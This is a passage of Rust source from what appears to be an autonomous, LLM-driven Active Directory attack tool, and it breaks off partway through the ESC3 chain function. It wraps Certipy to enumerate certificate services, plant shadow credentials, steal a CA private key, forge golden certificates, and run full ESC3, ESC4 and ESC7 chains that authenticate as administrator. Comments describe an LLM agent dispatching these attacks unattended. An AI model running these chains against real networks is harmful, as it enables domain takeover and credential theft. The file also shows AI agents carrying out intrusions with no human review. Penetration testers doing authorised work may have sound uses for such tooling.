//! ADCS / Certipy privilege escalation tool executors.

use anyhow::{Context, Result};
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Concatenate the stdout/stderr of a chained tool invocation under `=== <label> ===`
/// headers so an operator can tell which sub-step produced which output. Pure
/// formatting — kept separate from the chain drivers (which shell out to certipy
/// and are not unit-testable without subprocess mocks).
fn render_chain_output(steps: &[(&str, &ToolOutput)]) -> (String, String) {
    let stdout = steps
        .iter()
        .map(|(label, out)| format!("=== {label} ===\n{}", out.stdout))
        .collect::<Vec<_>>()
        .join("\n");
    let stderr = steps
        .iter()
        .map(|(label, out)| format!("=== {label} ===\n{}", out.stderr))
        .collect::<Vec<_>>()
        .join("\n");
    (stdout, stderr)
}

/// Milliseconds since the Unix epoch, or 0 if the system clock predates it.
/// Used to make certipy output filenames unique so certipy's interactive
/// "Overwrite? (y/n)" prompt never fires and kills a non-interactive run.
pub(crate) fn epoch_millis() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0)
}

/// Monotonic counter behind [`unique_run_token`].
static OUTPUT_SEQUENCE: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

/// A token no two output paths in one operation can share.
///
/// A millisecond timestamp alone is not unique: `acquire_tool_permit` lets
/// several exports run at once, and two writes against the same principal
/// inside one millisecond then land on the same filename. The process id
/// separates concurrent workers on a shared host and the counter separates
/// calls inside one process, so the triple cannot repeat.
///
/// Contains no `_`, which is what lets a caller append an account name after it
/// and split the two apart again.
pub(crate) fn unique_run_token() -> String {
    let seq = OUTPUT_SEQUENCE.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    format!("{}-{}-{seq}", epoch_millis(), std::process::id())
}

/// Answers certipy feeds itself when it stops to ask.
///
/// `certipy/lib/files.py` prompts `File '<x>' already exists. Overwrite?` on
/// every output it writes — the PFX from `req`/`shadow` and the ccache `auth`
/// saves *before* it extracts the NT hash. Tool children run with a null stdin,
/// so that prompt raises `EOFError` and the whole run dies after the attack has
/// already succeeded on the wire. `y` overwrites in place, which keeps the
/// output at the path the caller asked for; answering `n` would silently
/// relocate it to a UUID-suffixed name the caller never learns.
///
/// The same answer clears `auth`'s identity confirmation, where only a literal
/// `n` aborts.
const CERTIPY_PROMPT_ANSWERS: &str = "y\ny\ny\ny\ny\n";

fn certipy(subcommand: &str) -> CommandBuilder {
    CommandBuilder::new("certipy")
        .arg(subcommand)
        .stdin(CERTIPY_PROMPT_ANSWERS)
}

/// Delete every `*.ccache` file in `dir`, or in the process's current working
/// directory when `dir` is `None`.
///
/// Certipy derives its ccache filename from the cert subject and offers no
/// `-out` override, so a leftover file from an earlier run makes it stop on an
/// interactive `Overwrite? (y/n)` prompt. Failures are ignored: an unreadable
/// directory or an undeletable file leaves exactly the state the old
/// `rm -f *.ccache 2>/dev/null` left.
async fn remove_ccache_files(dir: Option<&std::path::Path>) {
    let dir = dir.unwrap_or_else(|| std::path::Path::new("."));
    let Ok(mut entries) = tokio::fs::read_dir(dir).await else {
        return;
    };
    while let Ok(Some(entry)) = entries.next_entry().await {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) == Some("ccache") {
            let _ = tokio::fs::remove_file(&path).await;
        }
    }
}

/// Switch a certipy invocation into cross-forest Kerberos mode using a forged
/// inter-realm ccache. Adds `-k -no-pass` and exports `KRB5CCNAME` (plus the
/// per-ccache `KRB5_CONFIG` shim) so certipy presents the cached service ticket
/// instead of attempting NTLM auth — which a foreign, SID-filtered DC rejects
/// with `rpc_s_access_denied` / `ept_s_not_registered`. Mirrors the
/// `ticket_path → KRB5CCNAME` wiring in `recon.rs` / `acl.rs` (Bug B): the
/// credential resolver injects `ticket_path` for cross-forest certipy calls, and
/// `tool_consumes_ticket_path()` must list the tool or the injection is silently
/// dropped.
fn apply_certipy_kerberos(cmd: CommandBuilder, ccache: &str) -> CommandBuilder {
    let ccache = certipy_consumable_ccache(ccache);
    cmd.arg("-k")
        .arg("-no-pass")
        .env("KRB5CCNAME", &ccache)
        .env("KRB5_CONFIG", format!("{ccache}.krb5.conf:/etc/krb5.conf"))
}

fn certipy_consumable_ccache(ccache: &str) -> String {
    let rehomed = super::trust::certipy_ccache_path_for(std::path::Path::new(ccache));
    if rehomed.exists() {
        return rehomed.to_string_lossy().into_owned();
    }
    ccache.to_string()
}

/// Enumerate ADCS certificate templates and CAs using Certipy.
///
/// Required args: `username`, `domain`, `dc_ip`
/// Optional args: `password`, `hashes`, `ticket_path`, `vulnerable`
pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
    match build_certipy_find_command(args)? {
        Some(cmd) => cmd.execute().await,
        None => {
            // Fail soft when the worker credential_resolver could not inject
            // any auth (no password, hash, or cross-forest ticket for this
            // principal). Hard-erroring with `required_str("password")?` caused
            // the LLM to "Assistance requested" and burn ~30k tokens reasoning
            // about a missing credential field; a structured stdout line lets
            // the agent move on.
            let username = required_str(args, "username")?;
            let domain = required_str(args, "domain")?;
            Ok(ToolOutput {
                stdout: format!(
                    "certipy_find: no credential resolved for {username}@{domain} (neither password, hash, nor cross-forest ticket in state); skipping enumeration.\n"
                ),
                stderr: String::new(),
                exit_code: Some(0),
                success: true,
            })
        }
    }
}

/// Build the `certipy find` command. Returns `Ok(None)` when no authentication
/// material (password, hash, or cross-forest ticket) resolved for the principal
/// so the async wrapper can emit a soft-skip line instead of a hard error.
///
/// Auth precedence: `ticket_path` (cross-forest ccache) > `hashes` > `password`.
#[doc(hidden)]
pub fn build_certipy_find_command(args: &Value) -> Result<Option<CommandBuilder>> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let vulnerable = optional_bool(args, "vulnerable").unwrap_or(true);
    let hashes = optional_str(args, "hashes").filter(|s| !s.is_empty());
    let password = optional_str(args, "password").filter(|s| !s.is_empty());
    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
    let dc_host = optional_str(args, "dc_host")
        .or_else(|| optional_str(args, "target"))
        .filter(|s| !s.is_empty());

    if ticket_path.is_none() && password.is_none() && hashes.is_none() {
        return Ok(None);
    }

    let user_at_domain = format!("{username}@{domain}");

    let mut cmd = certipy("find")
        .flag("-u", &user_at_domain)
        .flag("-dc-ip", dc_ip)
        .arg("-text")
        .arg("-stdout")
        .arg_if(vulnerable, "-vulnerable")
        .timeout_secs(120);

    if let Some(ccache) = ticket_path {
        cmd = cmd.flag_opt("-target", dc_host);
        cmd = apply_certipy_kerberos(cmd, ccache);
    } else if let Some(h) = hashes {
        cmd = cmd.flag("-hashes", h);
    } else if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }

    Ok(Some(cmd))
}

/// Request a certificate from an ADCS CA using Certipy.
///
/// Required args: `username`, `domain`, `ca`, `template`, `dc_ip`, and one of
///   `password` or `ticket_path` (cross-forest ccache).
/// Optional args: `upn`, `target` (CA server IP/hostname — use when CA is not on the DC),
///   `sid` (SID to embed in cert), `out` (output PFX filename)
pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
    build_certipy_request_command(args)?.execute().await
}

/// Build the `certipy req` command. Auth precedence: `ticket_path`
/// (cross-forest ccache via `-k -no-pass`) > `password`.
#[doc(hidden)]
pub fn build_certipy_request_command(args: &Value) -> Result<CommandBuilder> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
    let password = optional_str(args, "password").filter(|s| !s.is_empty());
    if ticket_path.is_none() && password.is_none() {
        anyhow::bail!(
            "certipy_request requires a password or cross-forest ticket_path — got neither"
        );
    }
    let ca = required_str(args, "ca")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let upn = optional_str(args, "upn");
    let sid = optional_str(args, "sid");
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));
    let application_policies = optional_str(args, "application_policies");

    let out = match optional_str(args, "out") {
        Some(o) => o.to_string(),
        None => format!("cert_{template}_{}", unique_run_token()),
    };

    let user_at_domain = format!("{username}@{domain}");

    let mut cmd = certipy("req")
        .flag("-username", user_at_domain)
        .flag("-ca", ca)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .flag("-out", out)
        .flag_opt("-target", target)
        .flag_opt("-upn", upn)
        .flag_opt("-sid", sid)
        .flag_opt("-application-policies", application_policies)
        .timeout_secs(120);

    if let Some(ccache) = ticket_path {
        cmd = apply_certipy_kerberos(cmd, ccache);
    } else if let Some(p) = password {
        cmd = cmd.flag("-password", p);
    }

    Ok(cmd)
}

/// Authenticate with a PFX certificate using Certipy.
///
/// Required args: `pfx_path`, `dc_ip`, `domain`
/// Optional args: `pfx_password` (passphrase that opens the PFX)
///
/// A PFX exported by [`crate::acl::pywhisker`] is always encrypted, so stage
/// two of a shadow-credential chain needs `certipy auth -password` or it dies
/// on `Failed to load PFX file: Invalid password or PKCS12 data` with the key
/// credential already planted. `certipy` gained `-password` on the `auth`
/// subcommand in 5.0.0; the flag is emitted only when a passphrase actually
/// applies, so `certipy req` output — unencrypted, and the input to every ADCS
/// chain in this module — is invoked exactly as before.
///
/// That same PFX carries no SAN, and certipy reads identities from the SAN
/// alone, so opening the file is still not enough: without `-username` the run
/// ends on `Could not find identity in the provided certificate` followed by
/// `Username or domain is not specified`. [`crate::acl::shadow_cred_pfx_identity`]
/// supplies it, and only for a `pywhisker` export.
pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
    let cmd = build_certipy_auth(args)?;

    // Certipy auth writes .ccache based on cert subject (e.g. administrator.ccache)
    // and does NOT support -out. Remove existing .ccache files to prevent the
    // interactive "Overwrite? (y/n)" prompt that kills non-interactive runs.
    remove_ccache_files(None).await;

    cmd.execute().await
}

#[doc(hidden)]
pub fn build_certipy_auth(args: &Value) -> Result<CommandBuilder> {
    let pfx_path = required_str(args, "pfx_path")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let domain = required_str(args, "domain")?;

    let mut cmd = certipy("auth")
        .flag_visible("-pfx", pfx_path)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .timeout_secs(120);

    if let Some(passphrase) = crate::acl::shadow_cred_pfx_password(args, pfx_path) {
        cmd = cmd.flag("-password", passphrase);
    }

    if let Some(identity) = crate::acl::shadow_cred_pfx_identity(args, pfx_path) {
        cmd = cmd.flag("-username", identity);
    }

    Ok(cmd)
}

/// Perform Certipy Shadow Credentials attack (auto mode).
///
/// Required args: `username`, `domain`, `target`, `dc_ip`
/// Required (one of): `ticket_path` (cross-forest ccache), `password`, `hashes`
pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
    // certipy shadow auto internally calls certipy auth which writes .ccache
    // based on the target account name. Remove existing .ccache to prevent the
    // interactive "Overwrite? (y/n)" prompt.
    remove_ccache_files(None).await;

    build_certipy_shadow_command(args)?.execute().await
}

/// Build the `certipy shadow auto` command. Auth precedence: `ticket_path`
/// (cross-forest ccache via `-k -no-pass`) > `hashes` > `password`.
#[doc(hidden)]
pub fn build_certipy_shadow_command(args: &Value) -> Result<CommandBuilder> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let target = required_str(args, "target")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
    // Treat an empty-string `hashes` as missing so the password fallback
    // fires. The LLM agent has been observed passing `hashes=""` when only
    // a password is available — without this guard the `-hashes ''` flag
    // is forwarded to certipy and certipy rejects the empty value.
    let hashes = optional_str(args, "hashes").filter(|s| !s.is_empty());
    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());

    let user_at_domain = format!("{username}@{domain}");

    let out = match optional_str(args, "out") {
        Some(o) => o.to_string(),
        None => format!("shadow_{target}_{}", unique_run_token()),
    };

    let mut cmd = certipy("shadow")
        .arg("auto")
        .flag("-username", user_at_domain)
        .flag("-account", target)
        .flag("-dc-ip", dc_ip)
        .flag("-out", out)
        .timeout_secs(120);

    if let Some(ccache) = ticket_path {
        cmd = cmd.flag_opt("-target", dc_host);
        cmd = apply_certipy_kerberos(cmd, ccache);
    } else if let Some(h) = hashes {
        cmd = cmd.flag("-hashes", h);
    } else {
        let password = required_str(args, "password")?;
        cmd = cmd.flag("-password", password);
    }

    Ok(cmd)
}

/// Certipy CA management operations (add-officer, issue-request, backup).
///
/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
/// Required: exactly one of:
///   - `add_officer` (bool, true)
///   - `issue_request` (integer request ID)
///   - `backup` (bool, true) — exports the CA private key to `<ca>.pfx` in CWD.
///     Requires SYSTEM-equivalent access on the CA host (e.g., the calling
///     process is running on a host where `username` is local administrator).
pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
    build_certipy_ca_command(args)?.execute().await
}

/// Build the `certipy ca` command. Auth precedence: `ticket_path` (cross-forest
/// ccache via `-k -no-pass`) > `password`. A forged inter-realm ticket lets the
/// `-backup` / `-add-officer` RPC hit a foreign CA that rejects NTLM.
#[doc(hidden)]
pub fn build_certipy_ca_command(args: &Value) -> Result<CommandBuilder> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
    let password = optional_str(args, "password").filter(|s| !s.is_empty());
    if ticket_path.is_none() && password.is_none() {
        anyhow::bail!("certipy_ca requires a password or cross-forest ticket_path — got neither");
    }
    let dc_ip = required_str(args, "dc_ip")?;
    let ca = required_str(args, "ca")?;

    let user_at_domain = format!("{username}@{domain}");

    let add_officer = optional_bool(args, "add_officer").unwrap_or(false);
    let backup = optional_bool(args, "backup").unwrap_or(false);
    let issue_request = args
        .get("issue_request")
        .and_then(|v| v.as_i64())
        .map(|v| v as i32);

    let mut cmd = certipy("ca")
        .flag("-username", user_at_domain)
        .flag("-dc-ip", dc_ip)
        .flag("-ca", ca)
        .timeout_secs(180);

    if let Some(ccache) = ticket_path {
        cmd = apply_certipy_kerberos(cmd, ccache);
    } else if let Some(p) = password {
        cmd = cmd.flag("-password", p);
    }

    if add_officer {
        cmd = cmd.flag("-add-officer", format!("{username}@{domain}"));
    }
    if let Some(req_id) = issue_request {
        cmd = cmd.flag("-issue-request", req_id.to_string());
    }
    if backup {
        cmd = cmd.arg("-backup");
    }

    Ok(cmd)
}

/// Forge a "Golden Certificate" from a stolen CA PFX (the `-backup` output of
/// `certipy_ca`). Produces a client PFX that authenticates as `upn` on the CA's
/// domain — the universal terminal node for ADCS compromise: any path that
/// gets SYSTEM on a CA host can chain `certipy_ca backup` → this tool →
/// `certipy_auth` to obtain a TGT/NT hash for any principal in the domain.
///
/// Required args: `ca_pfx` (path to stolen CA PFX), `upn` (target principal,
///                e.g. `administrator@fabrikam.local`)
/// Optional args: `subject`, `template`, `out` (output PFX path)
pub async fn certipy_forge(args: &Value) -> Result<ToolOutput> {
    build_certipy_forge_command(args)?.execute().await
}

#[doc(hidden)]
pub fn build_certipy_forge_command(args: &Value) -> Result<CommandBuilder> {
    let ca_pfx = required_str(args, "ca_pfx")?;
    let upn = required_str(args, "upn")?;
    let subject = optional_str(args, "subject");
    let template = optional_str(args, "template");

    let out = match optional_str(args, "out") {
        Some(o) => o.to_string(),
        None => {
            let safe_upn = upn.replace(['/', '\\', ' '], "_");
            format!("forged_{safe_upn}_{}.pfx", unique_run_token())
        }
    };

    Ok(certipy("forge")
        .flag_visible("-ca-pfx", ca_pfx)
        .flag("-upn", upn)
        .flag_opt("-subject", subject)
        .flag_opt("-template", template)
        .flag("-out", out)
        .timeout_secs(60))
}

/// Retrieve a previously issued certificate by request ID.
///
/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`,
///                `request_id`
/// Optional args: `target` (CA server IP)
pub async fn certipy_retrieve(args: &Value) -> Result<ToolOutput> {
    build_certipy_retrieve_command(args)?.execute().await
}

#[doc(hidden)]
pub fn build_certipy_retrieve_command(args: &Value) -> Result<CommandBuilder> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let ca = required_str(args, "ca")?;
    let request_id =
        args.get("request_id")
            .and_then(|v| v.as_i64())
            .ok_or_else(|| anyhow::anyhow!("missing required arg: request_id"))? as i32;
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));

    let user_at_domain = format!("{username}@{domain}");

    let ts = unique_run_token();
    let out = format!("cert_retrieve_{request_id}_{ts}");

    Ok(certipy("req")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-retrieve", request_id.to_string())
        .flag("-dc-ip", dc_ip)
        .flag("-out", out)
        .flag_opt("-target", target)
        .timeout_secs(120))
}

/// The sAMAccountName half of `user`, which may arrive bare or as a UPN.
fn bare_sam(user: &str) -> &str {
    user.split('@').next().unwrap_or(user)
}

/// Compose the identity `certipy -username` binds as.
///
/// `auth_domain` is the realm that issued `username`, which is not always the
/// realm the CA lives in — see `certipy_esc7_full_chain`. A `username` that
/// already carries a realm is trusted as given.
fn esc7_auth_identity(username: &str, auth_domain: &str) -> String {
    if username.contains('@') {
        username.to_string()
    } else {
        format!("{username}@{auth_domain}")
    }
}

/// Run the full ESC7 exploitation chain: add officer → request SubCA cert
/// (gets denied) → issue the pending request → retrieve cert → authenticate.
///
/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
/// Optional args: `target` (CA server IP), `auth_domain`, `upn`, `sid`
///
/// `domain` is the CA's domain: it scopes the impersonated `upn` and the
/// realm the certificate is minted in. `auth_domain` is the realm that issued
/// `username`, and is what the credential must bind as — a trust-sourced
/// credential from a child domain binds as `user@child`, never `user@parent`,
/// so composing both from `domain` yields `invalidCredentials (data 52e)`
/// before the chain's first step can run. Defaults to `domain`.
pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let ca = required_str(args, "ca")?;
    let upn = optional_str(args, "upn")
        .unwrap_or("administrator")
        .to_string();
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));
    let sid = optional_str(args, "sid");
    let auth_domain = optional_str(args, "auth_domain")
        .filter(|d| !d.trim().is_empty())
        .unwrap_or(domain);

    let upn_full = if upn.contains('@') {
        upn.clone()
    } else {
        format!("{upn}@{domain}")
    };

    let user_at_domain = esc7_auth_identity(username, auth_domain);
    let officer_sam = bare_sam(username);
    let mut outputs = Vec::new();

    let mut step1_cmd = certipy("ca")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-dc-ip", dc_ip)
        .flag("-ca", ca)
        .flag("-add-officer", officer_sam);
    if let Some(t) = &target {
        step1_cmd = step1_cmd.flag("-target", *t);
    }
    let step1 = step1_cmd.timeout_secs(120).execute().await?;
    outputs.push(("Add Officer", step1));

    let ts = unique_run_token();
    let out_name = format!("cert_esc7_{ts}");

    let mut req_cmd = certipy("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", "SubCA")
        .flag("-upn", &upn_full)
        .flag("-dc-ip", dc_ip)
        .flag("-out", &out_name);
    if let Some(t) = &target {
        req_cmd = req_cmd.flag("-target", *t);
    }
    if let Some(s) = &sid {
        req_cmd = req_cmd.flag("-sid", *s);
    }
    let step2 = req_cmd.timeout_secs(120).execute().await?;

    // Parse the request ID from certipy output (e.g., "Request ID is 42")
    let request_id = step2
        .stdout
        .lines()
        .chain(step2.stderr.lines())
        .find_map(|line| {
            let lower = line.to_lowercase();
            if lower.contains("request id") {
                line.split_whitespace()
                    .filter_map(|w| w.trim_end_matches('.').parse::<i32>().ok())
                    .next_back()
            } else {
                None
            }
        });
    outputs.push(("Request SubCA", step2));

    let Some(req_id) = request_id else {
        let combined = outputs
            .iter()
            .map(|(name, o)| format!("=== {name} ===\n{}\n{}", o.stdout, o.stderr))
            .collect::<Vec<_>>()
            .join("\n");
        return Ok(ToolOutput {
            stdout: combined,
            stderr: "ERROR: Could not parse request ID from certipy output".into(),
            exit_code: Some(1),
            success: false,
        });
    };

    let mut step3_cmd = certipy("ca")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-dc-ip", dc_ip)
        .flag("-ca", ca)
        .flag("-issue-request", req_id.to_string());
    if let Some(t) = &target {
        step3_cmd = step3_cmd.flag("-target", *t);
    }
    let step3 = step3_cmd.timeout_secs(120).execute().await?;
    outputs.push(("Issue Request", step3));

    let step4 = certipy("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-retrieve", req_id.to_string())
        .flag("-dc-ip", dc_ip)
        .flag("-out", &out_name);
    let mut step4 = step4;
    if let Some(t) = &target {
        step4 = step4.flag("-target", *t);
    }
    let step4_out = step4.timeout_secs(120).execute().await?;
    outputs.push(("Retrieve Cert", step4_out));

    // If certipy couldn't create a PFX (key mismatch), combine manually.
    let pfx_path = format!("{out_name}.pfx");
    let crt_path = format!("{out_name}.crt");
    let key_path = format!("{out_name}.key");
    if !tokio::fs::try_exists(&pfx_path).await.unwrap_or(false)
        && tokio::fs::try_exists(&crt_path).await.unwrap_or(false)
        && tokio::fs::try_exists(&key_path).await.unwrap_or(false)
    {
        let combine = CommandBuilder::new("openssl")
            .arg("pkcs12")
            .flag("-in", &crt_path)
            .flag("-inkey", &key_path)
            .arg("-export")
            .flag("-out", &pfx_path)
            .flag("-passout", "pass:")
            .timeout_secs(30)
            .execute()
            .await?;
        outputs.push(("Combine PFX", combine));
    }

    remove_ccache_files(None).await;

    let step5 = certipy("auth")
        .flag_visible("-pfx", &pfx_path)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .timeout_secs(120)
        .execute()
        .await?;
    let auth_success = step5.success;
    outputs.push(("Authenticate", step5));

    let combined_stdout = outputs
        .iter()
        .map(|(name, o)| format!("=== Step: {name} ===\n{}", o.stdout))
        .collect::<Vec<_>>()
        .join("\n");
    let combined_stderr = outputs
        .iter()
        .map(|(name, o)| format!("=== Step: {name} ===\n{}", o.stderr))
        .collect::<Vec<_>>()
        .join("\n");

    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: if auth_success { Some(0) } else { Some(1) },
        success: auth_success,
    })
}

/// Start a Certipy relay listener for ESC8 (HTTP) or ESC11 (RPC) attacks.
///
/// Required args: `target`, `ca`
/// Optional args: `template`
///
/// For ESC8:  `certipy relay -target http://ca-host -ca CA-NAME`
/// For ESC11: `certipy relay -target rpc://ca-host -ca CA-NAME`
pub async fn certipy_relay(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let ca = required_str(args, "ca")?;
    let template = optional_str(args, "template");

    certipy("relay")
        .flag("-target", target)
        .flag("-ca", ca)
        .flag_opt("-template", template)
        .timeout_secs(300)
        .execute()
        .await
}

/// Modify a certificate template for ESC4 exploitation using Certipy.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`
pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
    build_certipy_template_esc4_command(args)?.execute().await
}

#[doc(hidden)]
pub fn build_certipy_template_esc4_command(args: &Value) -> Result<CommandBuilder> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    Ok(certipy("template")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .arg("-save-old")
        .timeout_secs(120))
}

/// Modify a target account's `userPrincipalName` via `certipy account update`.
///
/// This is the missing primitive for ESC9 (set a GenericAll-controlled user's
/// UPN to `administrator@<domain>`, request a cert, then restore the UPN) and
/// ESC10 (UPN manipulation that makes the weak implicit cert mapping bind to a
/// privileged account). It keeps the whole ESC9/ESC10 chain on the privesc
/// worker — `certipy` is installed there, whereas the bloodyAD UPN-write tool
/// lives only on the `acl` worker, which lacks `certipy` to finish the chain.
///
/// Required args: `username`, `domain`, `password`, `user` (target principal),
///                `upn` (new value; pass the original to restore), `dc_ip`
pub async fn certipy_account_update(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let user = required_str(args, "user")?;
    let upn = required_str(args, "upn")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    certipy("account")
        .arg("update")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-user", user)
        .flag("-upn", upn)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

/// Run the full ESC4 exploitation chain: template modification -> cert
/// request -> authentication.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`,
///                `ca`
/// Optional args: `upn`, `target`, `sid`
pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
    let template_output = certipy_template_esc4(args).await?;

    // Generate a unique output name for the PFX and inject into args
    let template = args
        .get("template")
        .and_then(|v| v.as_str())
        .unwrap_or("esc4");
    let ts = unique_run_token();
    let out_name = format!("cert_{template}_{ts}");
    let pfx_path = format!("{out_name}.pfx");

    let mut req_args = args.clone();
    if let Some(obj) = req_args.as_object_mut() {
        obj.insert("out".into(), serde_json::json!(out_name));
    }
    let request_output = certipy_request(&req_args).await?;

    let mut auth_args = args.clone();
    if let Some(obj) = auth_args.as_object_mut() {
        obj.insert("pfx_path".into(), serde_json::json!(pfx_path));
    }
    let auth_output = certipy_auth(&auth_args).await?;

    let (combined_stdout, combined_stderr) = render_chain_output(&[
        ("Template Modification", &template_output),
        ("Certificate Request", &request_output),
        ("Authentication", &auth_output),
    ]);

    // The chain succeeds only if the final auth step succeeded.
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: auth_output.exit_code,
        success: template_output.success && request_output.success && auth_output.success,
    })
}

/// NetBIOS/flat domain name for certipy `-on-behalf-of` (`NETBIOS\principal`).
/// certipy rejects an FQDN there ("Domain part … should not be a FQDN") and the
/// CA then denies the request. Prefer an explicit `nt_domain`/`flat_name` arg;
/// otherwise derive it from the first DNS label of `domain`, uppercased
/// (`contoso.local` -> `CONTOSO`).
fn on_behalf_nt_domain(args: &Value, domain: &str) -> String {
    optional_str(args, "nt_domain")
        .or_else(|| optional_str(args, "flat_name"))
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain.split('.').next().unwrap_or(domain).to_uppercase())
}

/// Run the full ESC3 (Enrollment Agent) exploitation chain in one shot:
/// enroll the agent cert, request a cert on behalf of a target principal
/// using the agent cert, then authenticate with the resulting PFX.
///
/// ESC3 is a two-step attack and the existing single-step `certipy_request`
/// path silently skips it: `certipy req -template ESC3-CRA -on-behalf-of …`
/// REQUIRES the prior agent PFX from a separate `-template ESC3` enrollment.
/// LLM rounds dispatched against ESC3 vulns finish without ever firing the
/// `-pfx` branch because there's no obvious trigger in standard `certipy
/// find -vulnerable` output. This wraps both enrollments + the final auth
/// into a single deterministic worker invocation, with the intermediate
/// agent PFX persisted in a shared tempdir so the second `certipy req`
/// can read it via `-pfx`.
///
/// Required args: `username`, `domain`, `password`, `ca`, `dc_ip`,
///                `agent_template` (the EKU template — has `Certificate
///                Request Agent` application policy)
/// Optional args:
///   - `target` (CA host IP/hostname; falls through `ca_host`/`target_ip`)
///   - `on_behalf_template` (defaults to `User` — the universal client-auth
///     template that any DA can normally enroll; in some labs the on-behalf
///     target is a custom `<TEMPLATE>-CRA` template that requires CRA-signed
///     enrollment, override here)
///   - `on_behalf_of` (target principal sAMAccountName; defaults to
///     `administrator`)
///   - `nt_domain` / `flat_name` (NetBIOS domain for `-on-behalf-of`; derived
///     from the FQDN's first label if omitted)
pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let agent_template = required_str(args, "agent_template")?;
    let on_behalf_template = optional_str(args, "on_behalf_template").unwrap_or("User");
    let on_behalf_of = optional_str(args, "on_behalf_of").unwrap_or("administrator");
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));

    let user_at_domain = format!("{username}@{domain}");
    // Sole reason for the shared tempdir: certipy writes the agent PFX in
    // CWD, then the second `certipy req` reads it via `-pfx <name>.pfx` —
    // the two steps must run in the same directory. Two split dispatches
    // would land on different worker pods and the file would not be
    // visible to step 2.
    let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC3 chain")?;
    let cwd = tempdir.path().to_path_buf();

    let ts = unique_run_token();
    let agent_out = format!("agent_{ts}");
    let agent_pfx = format!("{agent_out}.pfx");
    let target_out = format!("target_{ts}");
    let target_pfx = format!("{target_out}.pfx");

    let agent_output = certipy("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", agent_template)
        .flag("-dc-ip", dc_ip)
        .flag("-out", &agent_out)
        .flag_opt("-target", target)
        .current_dir(&cwd)
        .timeout_secs(180)
        .execute()
        .await?;
    if !agent_output.success {
        return Ok(agent_output);
    }
